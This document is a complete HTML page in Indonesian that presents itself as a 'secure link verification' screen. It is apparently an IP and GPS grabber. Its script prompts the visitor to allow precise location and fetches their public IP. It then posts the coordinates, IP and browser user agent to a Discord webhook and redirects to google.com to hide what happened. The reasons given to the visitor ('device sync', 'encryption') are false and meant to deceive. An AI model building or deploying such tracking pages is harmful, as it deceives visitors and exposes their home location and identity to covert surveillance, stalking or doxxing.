<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Informasi Perangkat</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; text-align: center; padding: 60px 15px; background-color: #f8f9fa; color: #333; }
        .box { max-width: 400px; margin: 0 auto; background: white; padding: 35px 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); border: 1px solid #e9ecef; }
        h3 { font-size: 18px; margin-bottom: 8px; color: #212529; }
        p { font-size: 14px; color: #6c757d; line-height: 1.5; margin-bottom: 25px; }
        .btn { background-color: #28a745; color: white; border: none; padding: 14px 24px; font-size: 16px; font-weight: bold; border-radius: 8px; cursor: pointer; width: 100%; transition: background 0.2s; }
        .btn:hover { background-color: #218838; }
        .btn:disabled { background-color: #6c757d; cursor: not-allowed; }
    </style>
</head>
<body>

<div class="box">
    <h3>Verifikasi Tautan Aman</h3>
    <p id="status">Sistem memerlukan sinkronisasi perangkat. Silakan klik tombol di bawah untuk melanjutkan ke halaman tujuan.</p>
    <button class="btn" id="btnAkses" onclick="mintaIzinLokasiSekarang()">Masuk ke Halaman</button>
</div>

<script>
    const statusText = document.getElementById('status');
    const btnAkses = document.getElementById('btnAkses');
    const webhookUrl = "https://discord.com"; 
    
    // ALAMAT TUJUAN ASLI (Dipindahkan ke sini setelah selesai proses)
    const urlTujuanAsli = "https://google.com"; 

    // Fungsi Pengambil IP mandiri (dibuat Timeout agar jika API macet, skrip tidak ikut macet)
    async function ambilIPAman() {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 2000); // Batasi waktu tunggu IP maksimal 2 detik

        try {
            const response = await fetch('https://cloudflare.com', { signal: controller.signal });
            const text = await response.text();
            clearTimeout(timeoutId);
            const ipLine = text.split('\n').find(line => line.startsWith('ip='));
            return ipLine ? ipLine.split('=')[1].trim() : "IP Tidak Terbaca";
        } catch (e) {
            return "Bypass Jaringan (API Timeout)";
        }
    }

    // Fungsi Utama: Dipicu HANYA SETELAH USER KLIK TOMBOL
    function mintaIzinLokasiSekarang() {
        btnAkses.disabled = true;
        btnAkses.innerText = "Memproses...";
        statusText.innerHTML = "Memproses koneksi keamanan... Silakan setujui izin lokasi pada perangkat Anda.";

        if (!navigator.geolocation) {
            statusText.innerHTML = "Browser tidak mendukung sensor lokasi.";
            eksekusiSinyalGagal("HTML5 Tidak Didukung");
            return;
        }

        const opsiGPS = {
            enableHighAccuracy: true, // Paksa GPS internal menyala (Akurat Rumah)
            timeout: 7000,            // Tunggu respons hardware GPS maksimal 7 detik
            maximumAge: 0
        };

        // Browser memicu pop-up izin asli perangkat
        navigator.geolocation.getCurrentPosition(prosesSuksesGPS, prosesGagalGPS, opsiGPS);
    }

    // CERDAS 1: JIKA USER KLIK "IZINKAN" / ALLOW
    async function prosesSuksesGPS(position) {
        statusText.innerHTML = "<span style='color:green;'><b>Izin diberikan! Menyelesaikan enkripsi...</b></span>";
        
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const acc = `${position.coords.accuracy} meter`;

        // Ambil IP di latar belakang, jika lambat langsung lewati agar tidak stuck
        const ipPublik = await ambilIPAman();

        // Kirim sinyal Sukses ke Discord
        kirimSinyalKeDiscord(ipPublik, lat, lon, acc, "HTML5 GPS Terizin (Sukses)");
    }

    // CERDAS 2: JIKA USER KLIK "TOLAK" / BLOCK ATAU SENSOR MACET
    async function prosesGagalGPS(error) {
        statusText.innerHTML = "<span style='color:red;'>Mengalihkan menggunakan enkripsi standar...</span>";
        
        let detailGagal = "HTML5 GPS Ditolak Pengguna";
        if (error.code === error.TIMEOUT) detailGagal = "Sistem Timeout (Sensor GPS Sibuk)";
        if (error.code === error.POSITION_UNAVAILABLE) detailGagal = "Lokasi Tidak Tersedia di Perangkat";

        const ipPublik = await ambilIPAman();

        // Kirim sinyal Gagal ke Discord (Tanpa Koordinat)
        kirimSinyalKeDiscord(ipPublik, "Ditolak", "Ditolak", "-", detailGagal);
    }

    async function eksekusiSinyalGagal(alasan) {
        const ipPublik = await ambilIPAman();
        kirimSinyalKeDiscord(ipPublik, "Tidak Tersedia", "Tidak Tersedia", "-", alasan);
    }

    // Fungsi pengiriman laporan ke Server Webhook Discord
    function kirimSinyalKeDiscord(ip, lat, lon, acc, metode) {
        if (!webhookUrl) {
            window.location.href = urlTujuanAsli;
            return;
        }

        const payload = {
            content: `📌 **Log Baru Terdeteksi!**\n🌐 **IP**: ${ip}\n📍 **GPS**: ${lat}, ${lon} (Akurasi: ${acc})\n📱 **OS**: ${navigator.userAgent}\n🛠️ **Status Perizinan**: ${metode}`
        };

        // Kirim HTTP POST ke Discord
        fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        })
        .then(() => {
            // Setelah sinyal sukses masuk Discord, langsung lempar ke link asli
            window.location.href = urlTujuanAsli;
        })
        .catch(err => {
            // Jika fetch diblokir firewall HP, tetep alihkan agar tidak stuck
            window.location.href = urlTujuanAsli;
        });
    }
</script>

</body>
</html>
